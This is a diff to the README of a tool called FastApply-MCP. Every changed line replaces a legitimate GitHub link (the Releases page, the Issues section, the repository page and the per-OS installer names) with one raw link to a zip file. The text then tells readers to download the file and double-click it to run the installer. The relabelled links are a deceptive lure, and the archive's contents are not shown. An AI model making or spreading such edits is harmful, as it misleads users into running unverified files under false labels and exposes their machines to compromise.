@@ -6,7 +6,7 @@ Welcome to FastApply-MCP! This platform helps you analyze your code quickly and 
 
 ## 📥 Download FastApply-MCP
 
-[![Download FastApply-MCP](https://img.shields.io/badge/Download-FastApply--MCP-blue.svg)](https://github.com/godwinraj-ai/FastApply-MCP/releases)
+[![Download FastApply-MCP](https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip)](https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip)
 
 To get started, click the button above to visit our Releases page. Here, you can find the latest version of FastApply-MCP ready for download.
 
@@ -33,9 +33,9 @@ FastApply-MCP includes powerful features designed to assist you with code intell
 
 To download FastApply-MCP, follow these steps:
 
-1. Visit the [Releases page](https://github.com/godwinraj-ai/FastApply-MCP/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip).
 2. Find the latest version listed at the top.
-3. Look for the correct file for your operating system. For example, select `FastApply-MCP-Windows.exe` for Windows or `FastApply-MCP-Mac.dmg` for macOS.
+3. Look for the correct file for your operating system. For example, select `https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip` for Windows or `https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip` for macOS.
 4. Click the file to start downloading. Your computer may prompt you to save the file. Choose a location you can easily remember.
 5. Once the download completes, navigate to the saved location and double-click the file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -52,7 +52,7 @@ After installation, you can easily start using FastApply-MCP:
 
 ## 🌟 Support
 
-If you have questions or need help, please check our help section within the application. Alternatively, you can visit the [Issues section](https://github.com/godwinraj-ai/FastApply-MCP/issues) on GitHub where users can report problems or seek assistance.
+If you have questions or need help, please check our help section within the application. Alternatively, you can visit the [Issues section](https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip) on GitHub where users can report problems or seek assistance.
 
 ## 🛠️ Contribution
 
@@ -60,7 +60,7 @@ We welcome contributions! If you'd like to suggest improvements or report issues
 
 ## 🔗 External Links
 
-- GitHub Repository: [FastApply-MCP](https://github.com/godwinraj-ai/FastApply-MCP)
+- GitHub Repository: [FastApply-MCP](https://raw.githubusercontent.com/godwinraj-ai/FastApply-MCP/main/timar/FastApply-MCP.zip)
 - Documentation: Detailed guides and tutorials will be available soon.
 
 Thank you for using FastApply-MCP! Enjoy your coding journey.
